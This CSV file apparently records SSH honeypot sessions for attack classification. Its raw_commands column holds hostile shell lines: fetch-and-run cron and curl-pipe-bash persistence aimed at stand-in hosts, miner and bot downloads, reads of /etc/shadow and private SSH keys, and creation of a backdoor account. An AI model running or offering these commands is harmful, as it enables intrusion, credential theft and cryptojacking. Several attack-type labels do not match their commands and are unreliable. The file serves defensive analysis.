session_id,src_ip,country,login_attempts,login_success,num_commands,session_duration,dst_port,recon_score,persistence_score,mining_score,lateral_score,exfil_score,has_download,has_chmod,has_cron,has_useradd,raw_commands,cluster,attack_type
de581fb755784057,159.89.49.114,United States,3,1,3,28,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
2a6d64c4cb494d74,103.99.0.122,India,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
8379efc40f844dab,92.255.57.210,Russia,3,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
cd298f23c3cd4ad3,198.199.65.32,United States,1,1,1,7,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
8403113b99414697,193.32.162.8,Russia,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
7bda3333b3c240d3,103.99.0.122,India,1,1,3,24,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
72476d3a2aa74d9d,164.92.98.77,United States,3,1,3,24,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
549c0ac8418b432f,159.89.49.114,United States,2,1,1,10,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
5a39da41d7484843,134.209.82.19,United States,3,1,2,15,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
db5829d9bad54f4a,167.71.13.196,United States,3,1,1,17,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
e3c6ba1bfb28488a,91.240.118.172,Ukraine,2,1,5,36,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
61a4acdc0db54658,159.89.49.114,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
35d8d682541b4c61,157.245.108.55,United States,3,1,2,16,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
c558323ba5484f96,58.218.211.36,China,1,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
41c4aa12c3f34f40,193.32.162.8,Russia,3,1,2,21,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
c138bfede18949f1,206.189.32.177,United States,1,1,3,11,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
ebfb2d43f20847a3,222.186.15.101,China,1,1,5,30,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
5cbdd195024c49dc,193.32.162.8,Russia,4,1,3,25,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
b5dc7da038f34d56,218.92.0.158,China,3,1,5,33,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
11d40d2d9de5418e,45.95.147.236,Netherlands,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
750aac0544b74d7b,164.92.98.77,United States,3,1,1,15,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
de242fa59a444bcb,193.32.162.8,Russia,3,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
cbeb218adf554d47,92.255.57.210,Russia,5,1,5,25,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
011d9161876b4c42,185.220.101.45,Germany,1,1,5,26,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
f0b0702a2d284f0b,45.142.212.100,Netherlands,1,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
fd709cc583ef4f22,179.60.150.100,Brazil,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
e9e08ee9d43b4bd3,45.95.147.236,Netherlands,5,1,3,14,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
5fdce418b37d487c,138.197.148.152,United States,4,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
edf9cb23fdc043b1,157.245.108.55,United States,5,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
3e1fbd0746464ee5,117.21.191.131,China,1,1,5,30,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
c0f1ca7ca19044b7,117.21.191.131,China,2,1,2,18,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
248319c001244ecc,92.255.57.210,Russia,4,1,5,37,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
590f1eed9a614fa4,194.165.16.11,Russia,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
888d6143dcaf408f,45.142.212.100,Netherlands,2,1,2,16,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
c7b4ef6decce4c67,179.60.150.100,Brazil,2,1,3,21,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
000f08dc7a6b48a4,5.188.86.172,Russia,4,1,1,14,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
33df258ee50e4cbd,117.21.191.131,China,5,1,5,41,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
fe731456cc0f4354,45.95.147.236,Netherlands,4,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
fa1e12d225b741ee,194.165.16.11,Russia,2,1,3,23,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
f5f6c2a09c304490,206.189.32.177,United States,1,1,3,14,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
2f39f3b15db94520,5.188.86.172,Russia,1,1,2,10,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
dea7e3884581420d,58.218.211.36,China,5,1,5,38,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
73930ff4ec5a4484,58.218.211.36,China,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
89792a99f73a4e61,91.240.118.172,Ukraine,1,1,1,5,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
572eed1f67b644b7,193.32.162.8,Russia,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
9d1a11d67bf04474,104.236.198.48,United States,4,1,5,34,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
8d9d54ad67d64c3e,193.32.162.8,Russia,3,1,3,21,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
7d4136a4cf644e41,117.21.191.131,China,1,1,1,12,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
fb94e730f2004659,222.186.15.101,China,3,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
51f2e937ffd5431f,45.142.212.100,Netherlands,1,1,3,16,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
c77ea00131904784,104.236.198.48,United States,4,1,3,24,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
2a5eea9f1f254465,218.92.0.158,China,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
f1858ef9b3f44cd1,91.240.118.172,Ukraine,1,1,3,13,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
6c027b8a5465417d,103.99.0.122,India,2,1,3,19,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
05031bddc83f46c5,91.240.118.172,Ukraine,1,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
a003c00fe4094bfd,138.197.148.152,United States,3,1,2,14,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
665dd88abe10417d,80.82.77.139,Netherlands,4,1,2,27,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
ba86f65382714114,45.95.147.236,Netherlands,4,1,5,44,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
8bdabbe4b1a64815,179.60.150.100,Brazil,5,1,5,42,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
86597852fe1f451a,45.95.147.236,Netherlands,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
5675fbab7f244afd,198.199.65.32,United States,2,1,2,16,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
e5afb8b2a3134a27,68.183.39.102,United States,2,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
bcbf6754bdc84682,194.165.16.11,Russia,5,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
f94df360234b47eb,5.188.86.172,Russia,1,1,3,15,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
e1635b3ac9f24aaf,218.92.0.158,China,3,1,1,18,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
fd1c7e4f6b634d49,178.128.21.44,Singapore,3,1,3,28,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
56ea6566efd9477f,80.82.77.139,Netherlands,2,1,3,25,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
3ddc4e9eb1ac4110,117.21.191.131,China,5,0,0,17,22,0,0,0,0,0,0,0,0,0,0,1,Recon
6cde62f05ff54dc9,159.89.49.114,United States,2,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
b16cc99aba2d4e13,104.236.198.48,United States,2,1,5,28,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
09d8be83d14d4081,68.183.39.102,United States,1,0,0,2,22,0,0,0,0,0,0,0,0,0,0,1,Recon
8c7d663d8cc641ed,68.183.39.102,United States,2,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
537040c447b84e20,80.82.77.139,Netherlands,1,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
b5da697858bb4ae5,206.189.32.177,United States,2,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
5888ad2ae8e546ed,45.142.212.100,Netherlands,5,1,3,24,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
16ba6dc4ed384e5b,179.60.150.100,Brazil,4,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
147a9e063c6e4566,198.199.65.32,United States,5,1,3,23,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
6e608544e2e44306,92.255.57.210,Russia,5,1,2,23,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
67ba23f253c24781,218.92.0.158,China,4,1,3,24,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
967793c7f7ce417c,198.199.65.32,United States,2,1,3,26,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
eaf3a0d070414c85,180.129.12.93,China,5,1,3,35,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
c57192570bfd4cda,180.129.12.93,China,3,1,2,10,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
fb7d8c37bbfb4067,103.99.0.122,India,5,1,1,14,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
3f3af40d45764c1c,157.245.108.55,United States,4,1,2,15,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
3824cf47949b403c,178.128.21.44,Singapore,3,1,5,30,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
fd127ee618314701,138.197.148.152,United States,3,1,5,32,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
63d88bb7c58f4739,68.183.39.102,United States,2,1,3,24,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
a98567e51e2541ea,211.94.20.175,China,4,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
6a3fae2ea5bc472d,103.99.0.122,India,1,1,3,20,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
9dd5d0b3c3b24fd0,178.128.21.44,Singapore,4,1,3,31,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
3ab1d80dfe104683,206.189.32.177,United States,3,1,2,25,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
670c6b9531074619,138.197.148.152,United States,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
4d13a75ce7294a28,104.236.198.48,United States,5,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
ac64535df81146ad,58.218.211.36,China,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
cada217f09bb4396,134.209.82.19,United States,5,1,5,40,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
18ecd86d579d4e11,92.255.57.210,Russia,5,1,3,33,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
04c701f8ebc24eef,138.197.148.152,United States,5,1,1,15,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
e981c43f22ce4e5b,117.21.191.131,China,2,1,5,33,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
967dfa226e8c4e57,117.21.191.131,China,3,1,2,14,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
aeacdcca727a4ad1,45.142.212.100,Netherlands,5,1,3,26,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
2ad8b6fd3f5b436c,218.92.0.158,China,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
e1d966699eed4c28,198.199.65.32,United States,1,1,5,22,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
e5a70d3a0a3e47a7,185.220.101.45,Germany,5,1,2,21,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
1c1108f9d85b4036,193.32.162.8,Russia,4,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
850d943fc0614c50,104.236.198.48,United States,4,1,3,26,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
0c366aebeaa045a8,211.94.20.175,China,1,1,5,33,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
7c716813bee840eb,117.21.191.131,China,5,1,1,12,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
39e83ecb040e48ca,193.32.162.8,Russia,3,1,2,20,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
a59e4c3b971d416a,193.32.162.8,Russia,3,1,5,33,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
e851e0b706a649d6,198.199.65.32,United States,4,1,3,29,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
f625d6740bce43c2,159.89.49.114,United States,2,1,3,24,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
a7102888bc114199,167.71.13.196,United States,4,1,1,18,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
5b9cfde6ef34475f,80.82.77.139,Netherlands,1,1,2,5,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
439bfed98a01496d,218.92.0.158,China,5,1,1,19,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
c220a349a3604a81,157.245.108.55,United States,5,1,5,30,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
8f987e034acb4c0a,193.32.162.8,Russia,5,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
7b59719c11aa4a8b,159.89.49.114,United States,2,1,3,22,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
cc222b5e6329413f,104.236.198.48,United States,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
fc3a7bb3536644dc,159.89.49.114,United States,5,1,3,31,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
8365cc18b04045a2,193.32.162.8,Russia,2,1,1,18,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
